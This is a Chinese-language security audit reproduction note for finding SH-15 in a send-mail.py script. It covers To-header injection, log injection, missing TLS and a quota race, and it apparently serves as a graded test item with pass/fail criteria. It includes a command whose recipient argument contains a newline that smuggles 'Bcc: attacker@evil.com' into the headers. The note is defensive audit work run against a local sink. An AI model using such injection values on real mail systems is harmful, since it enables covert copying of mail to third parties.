# SH-15 复现物：send-mail.py 邮件头构造未过滤（To 可注入）/日志注入/TLS 盲区/配额竞态

- 级别：P3（当前唯一调用方有 `FILTER_VALIDATE_EMAIL` 兜底，Web 不可达；属“脚本本身不安全 + 后续调用方会踩”的加固项）
- 位置：`cloud/usr/local/sbin/send-mail.py:107-122`（头构造）、`:124-130`（日志）、`:51-73`（配额）、`:116`（msmtp）；`cloud/var/www/chat-lib/lib.php:331-340`（调用方）

## 环境要求

- 本机：Python 3（`email.header` 真实执行）。
- 端到端需要：msmtp + `/etc/msmtprc`（未交付）+ 可收信邮箱。

## 可复制命令

```powershell
C:\Users\18012\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\python\python.exe `
  D:\Desktop\新建文件夹\work\repro\sh-infra\SH-15\poc.py
```

## 期望输出

- 构造出的邮件头里出现 `Bcc: attacker@evil.com` 与 `X-Injected: 1`（To 注入成功）；
- 主题被 `Header(...).encode()` 编码为 `=?utf-8?...?=`（主题注入不成立）；
- 6 项静态核对成立（无 CR/LF 过滤、无邮箱校验、msmtp argv 调用、日志未净化、配额无锁、无 TLS 配置）；
- 列出 `FILTER_VALIDATE_EMAIL` 的 5 个入口 → 说明当前 Web 不可达；
- 日志注入演示：`who` 含换行时日志行数 +1；
- 末行 `VERDICT: REPRODUCED`。

## 判定标准

- 复现通过：To 注入成功、主题注入失败（说明区分清楚），且脚本内无净化逻辑。
- 复现失败：若已用 `email.message.EmailMessage` 或显式拒绝 `\r\n`，模型应报 FAIL。

## 真实环境复现（自有测试机，需改 msmtprc 指向本地 sink）

```bash
# 1) 用本地 smtp sink（如 python -m aiosmtpd -n -l 127.0.0.1:2525）收信
# 2) 直接调用脚本（绕过 Web 的邮箱校验）
/usr/local/sbin/send-mail.py --via smtp "victim@example.com
Bcc: attacker@evil.com" "test" "body"
# 3) 看 sink 收到的原始邮件是否多出 Bcc 头；并检查 msmtp 是否因信封地址非法而先失败
```
